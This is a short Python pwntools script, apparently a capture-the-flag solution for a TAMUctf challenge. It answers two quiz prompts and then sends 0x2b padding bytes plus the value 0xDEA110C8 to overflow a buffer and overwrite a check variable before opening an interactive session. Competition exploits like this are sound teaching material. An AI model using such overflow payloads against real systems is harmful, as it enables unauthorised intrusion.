from pwn import *

r = remote("pwn.tamuctf.com", 4321)

r.sendlineafter("name?", "Sir Lancelot of Camelot")
r.sendlineafter("quest?", "To seek the Holy Grail.")
r.sendlineafter("secret?", "A"*0x2b + p32(0xDEA110C8))
r.interactive()

r.close()
